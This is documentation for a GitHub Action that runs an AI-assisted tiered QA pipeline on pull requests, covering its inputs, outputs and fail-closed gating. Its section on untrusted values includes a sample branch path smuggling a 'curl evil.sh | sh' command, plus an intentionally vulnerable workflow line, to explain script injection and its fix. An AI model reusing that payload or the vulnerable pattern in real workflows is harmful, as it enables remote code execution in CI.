# GitHub Action

`warden-action` runs the whole tiered QA pipeline on every pull request and posts results back to GitHub.

## Quick start

```yaml
# .github/workflows/ai-qa.yml
name: AI QA
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  pull-requests: write
  checks: write

jobs:
  warden:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
      - uses: actions/setup-node@v4
        with: { node-version: 20 }
      - run: npm ci
      - name: Start app
        run: npm run dev &
      - run: npx wait-on http://localhost:3000 --timeout 60000
      - uses: QuintinBotes/warden@v1
        with:
          strategy: exploratory
          risk-threshold: '4'
          anthropic-api-key: ${{ secrets.ANTHROPIC_API_KEY }}
```

## What the action needs on the runner

The action does not contain the test machinery: it shells out to the Warden CLI, once per
step, as `npx --yes --package=@warden/cli -- warden <command>`. The package name is explicit
because the unscoped `warden` on npm is an unrelated 2014 package with no executable in it —
a bare `npx warden` downloads that instead and dies with "could not determine executable to
run".

**`@warden/cli` is not published to npm yet**, so on a runner those calls return a 404 until it
is. `npx` prefers a copy already present in the job's `node_modules` over the registry, so the
way to use the action before publication is to put one there: check out and build this
repository ([CLI Reference](cli.md#installing)), then install the built `packages/cli` into the
workspace the action runs in.
[`.github/workflows/warden-selftest.yml`](https://github.com/QuintinBotes/warden/blob/main/.github/workflows/warden-selftest.yml)
takes the other route — it skips the action and runs the built binary directly.

## Inputs

| Input | Default | Description |
|-------|---------|-------------|
| `provider` | `anthropic` | AI provider for the exploratory agent: `anthropic`, `openai`, `gemini`, or `ollama`. Passed to `warden agent --provider`, overriding `ai.provider` in your config. |
| `model` | (config) | Model id for that agent run. Passed to `warden agent --model`; empty means the configured `ai.model`. |
| `strategy` | `exploratory` | Agent strategy to run. |
| `risk-threshold` | `4` | Risk score at which the exploratory agent runs. An *unknown* risk always runs it — see below. |
| `anthropic-api-key` | — | **Required.** Your Anthropic key (pass as a secret). |

## Outputs

| Output | Description |
|--------|-------------|
| `gate` | `PASS`, `WARN`, or `BLOCK`. |
| `risk-score` | The computed risk score (0–10), or `unknown` when the diff could not be read. |
| `report-path` | Path to the aggregated CTRF report. |
| `incomplete-tiers` | Comma-separated names of tiers that did not complete (empty on a clean run). |

| `configured` | `true` / `false` — whether the repository has a `warden.config`. Unset when the CLI did not report it (unknown, not `false`). |

When the repository has no `warden.config`, the Action logs a warning, sets `configured` to
`false`, and prints a note in the PR comment and the job summary saying the risk score and the
tiers that ran came from Warden's built-in defaults. The gate decision itself is unchanged: tests
that passed still pass. What changes is that a green check on an unconfigured repository now says
it is one.

Use them in later steps:

```yaml
      - uses: QuintinBotes/warden@v1
        id: qa
        with:
          anthropic-api-key: ${{ secrets.ANTHROPIC_API_KEY }}
      - if: steps.qa.outputs.gate == 'BLOCK'
        run: exit 1
```

## `fetch-depth: 0` is required

The Action's first step is `warden analyze`, which runs `git diff <base> <head>` against the
checkout. `actions/checkout` defaults to `fetch-depth: 1`, and a clone of depth 1 does **not**
contain the PR's base commit — so the diff cannot be read at all. Check out the full history:

```yaml
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }
```

### What happens when the diff cannot be read

The change surface is then **unknown**, and Warden reports it as unknown rather than scoring it.
It does not fall back to the smallest run:

| | Diff read | Diff unreadable |
|---|---|---|
| `risk-score` output | `0`–`10` | `unknown` |
| PR report / job summary | `**Risk Score:** 7/10 (HIGH — …)` | `**Risk Score:** unknown`, above a banner naming the error and this remedy |
| Regression tier | the tags the diff touched | the full `@regression` suite |
| AI exploratory agent | runs when risk ≥ `risk-threshold` | always runs — an unknown risk is not a low one |

The gate decision itself is unaffected: it is still whatever the tiers that ran reported. The run
is broader than a scoped one and slower, which is the point — nothing about it is scoped to your
changes, and no surface implies that it is.

## What the Action runs

The Action does not reimplement any tier — it composes the `warden` CLI as a subprocess, so
what runs in CI is what you can run locally:

```bash
warden analyze --base <base-sha> --head <head-sha>
warden run --grep @smoke      --output warden-reports/smoke.ctrf.json      --artifacts-dir warden-artifacts/smoke
warden run --grep <tags>      --output warden-reports/regression.ctrf.json --artifacts-dir warden-artifacts/regression \
           --base <base-sha> --head <head-sha> [--base-url <preview-url>]
warden agent --strategy <s> --url <app-url> --pr-number <n> \
           --provider <provider> [--model <id>] --output warden-artifacts/exploratory.json
warden report aggregate --reports warden-reports --pr <n> --json
```

Two directories, and the split matters:

| Directory | Env override | Contents |
|-----------|--------------|----------|
| `warden-reports` | `WARDEN_REPORTS_DIR` | One CTRF report per test tier — and nothing else. The aggregate step parses *every* `*.json` directly inside it as CTRF, so a non-CTRF file there fails the gate. |
| `warden-artifacts` | `WARDEN_ARTIFACTS_DIR` | Per-tier screenshots/videos/reporter output, plus the agent's `exploratory.json`. |

A tier that fails is downgraded to a workflow warning so the gate still runs; the gate itself
fails **closed**, so an aggregate step that cannot be read is a `BLOCK`, never a green check.

The `provider` and `model` inputs reach the agent as `--provider`/`--model`, which override
`ai.provider` and `ai.model` from the repo's `warden.config.*` for that run only.

Because the CLI is a subprocess with no compile-time link to the Action, the two can disagree
about a flag and nothing fails until a real job runs — and a tier failure there is downgraded to a
warning, so a bad flag reads as a pipeline that quietly produced no reports. The argv the Action
builds is therefore asserted against the CLI's own Commander tree, in
`packages/github-action/src/warden-cli.contract.test.ts` and
`packages/github-action/src/cli-contract.test.ts`.

## When a tier does not complete

Tiers fail for reasons that have nothing to do with your code: a browser is OOM-killed, the preview
URL is down, `npx` cannot install, the runner is evicted. A tier that dies that way writes no report
file — so the aggregate step that follows scores only the tiers that survived.

Warden fails **closed** here. The pipeline still finishes (the tiers that did run are worth
reporting), but:

- the gate decision is `BLOCK`, whatever the surviving tiers said, and the reason names the lost
  tier and its error;
- the step fails (`setFailed`), so a required check on it goes red;
- the check-run title reads `Warden QA: BLOCK — tier did not complete: regression` instead of a
  failure count taken from a partial suite;
- the job summary and the PR comment are fronted by a banner listing each lost tier and its error;
- the `incomplete-tiers` output lists them, for later steps that want to branch on it.

The reasoning is the same as for a crashed aggregate step: a verdict over an unknown subset of the
suite is not a verdict. A tier that is *deliberately* not run is a different thing and stays silent
— the exploratory agent below `risk-threshold`, or the route-scoped a11y/perf tiers with no
`base-url` — because a tier that never started leaves no hole where evidence was expected.

## The full tiered workflow

For fine-grained control, run each tier as its own job. A reference workflow ships with the Action as `ai-qa.example.yml`, implementing:

- **Tier 1 — Smoke**: `@smoke` tests on every push. The green gate for everything else.
- **Tier 2 — Selective regression**: only the tags the diff touched.
- **Tier 3 — AI exploratory**: the Claude agent, gated on risk.
- **Tier 4 — API contract tests**: when API routes changed.
- **Tier 5 — Test generation**: commit AI-generated tests back for high-risk PRs.
- **QA gate**: aggregate everything and post the decision.

Jobs do not share a filesystem. Every tier job must upload its CTRF with
`actions/upload-artifact`, and the gate job must download them with
`actions/download-artifact` before running `warden report aggregate`. `download-artifact`
unpacks each artifact into a directory of its own under `path`; `warden report aggregate`
searches `--reports` recursively, so that nesting is fine. Keep non-CTRF JSON — the
`AgentOutput` from `warden agent`, for one — out of the downloaded tree, since every
`*.json` found there is parsed as CTRF.

`warden init` writes a starter version of this workflow into your repo, with that
plumbing already in place. It will not replace an `ai-qa.yml` you have already edited
without your confirmation — see [`warden init`](cli.md#warden-init).

## How the Action reaches the gate

The Action does not import the CLI — it shells out to `npx --yes --package=@warden/cli -- warden`
(never the bare `npx warden`, which is somebody else's package), exactly as a hand-written
workflow would. The last of those calls is the one that decides the merge:

```
npx --yes --package=@warden/cli -- warden report aggregate --reports <dir> --pr <n> --json
```

`--json` is required, not cosmetic. Without it the CLI prints a sentence for a human and the
Action has nothing to parse; because a gate that cannot be read [fails closed](../CHANGELOG.md),
that reads as `BLOCK` on every pull request. The `warden` version `npx` resolves must therefore
be new enough to support `--json` — pin the CLI in your workflow (`--package=@warden/cli@<version>`,
or a `devDependency`) if you need that guaranteed rather than inferred from `npx`'s latest.

The parsed shape is `GateReport` from `@warden/core`, documented under
[`warden report`](cli.md#warden-report).

## Untrusted values in a `run:` step

A `pull_request` workflow runs against a branch anyone can write. GitHub substitutes
`${{ … }}` into a `run:` script as **text**, before the shell parses it, so an expression
carrying pull-request data is pull-request-controlled shell.

`needs.analyze.outputs.test_tags` is exactly that: a tag is derived from a changed file's own
path, so a branch adding `apps/$(curl evil.sh | sh)/page.tsx` puts that command in the script.
Bind the value to `env:` and read it as `"$VAR"` — an environment variable is data the shell
never re-scans:

```yaml
# Wrong — the tag text becomes part of the command line.
- run: npx --yes --package=@warden/cli -- warden run --grep "${{ needs.analyze.outputs.test_tags }}"

# Right — the tag text is one argument, whatever it contains.
- env:
    TEST_TAGS: ${{ needs.analyze.outputs.test_tags }}
  run: npx --yes --package=@warden/cli -- warden run --grep "$TEST_TAGS"
```

The same holds for anything else a PR influences: branch and PR titles, author names, and label
names. The workflows Warden scaffolds and ships follow this rule, and a test in the repository
fails if a `${{ … }}` ever reappears inside one of their `run:` scripts.

## Required permissions

The workflow needs:

```yaml
permissions:
  contents: read         # read the diff (add write only if committing generated tests)
  pull-requests: write   # post the PR review comment
  checks: write          # publish the check run + inline annotations
```

## How the Action reads the CLI

The Action shells out to the `warden` CLI for every tier and for the gate. A `BLOCK` makes the
CLI exit `1` ([Exit codes](cli.md#exit-codes)) *after* writing everything it was asked to write,
so the Action treats a non-zero exit that printed a gate decision as the result it is: a tier
whose tests failed is a finished tier, and a blocked aggregate still yields the report the PR
comment and check run are built from. A non-zero exit with no gate decision in it is a crash, and
the Action still fails **closed** on it — an unevaluated gate resolves to `BLOCK` rather than
posting a green check.

## Reporting surfaces

Every run produces four surfaces at once — see [Reporting](reporting.md):

1. GitHub Job Summary
2. PR review comment (the AI report)
3. Check-run annotations (inline on changed files)
4. A CTRF JSON artifact

### When the agent tier does not run

A failing tier is downgraded to a warning so the gate still runs, and the exploratory agent is skipped outright below `risk-threshold`. In both cases the report's bug section reads **`🐛 Bugs Found (not measured)`** and names the reason, instead of the `Bugs Found (0)` / "No bugs found by the AI exploratory agent ✅" that a completed, clean run earns. Zero is a measurement; an agent that never looked did not make one.
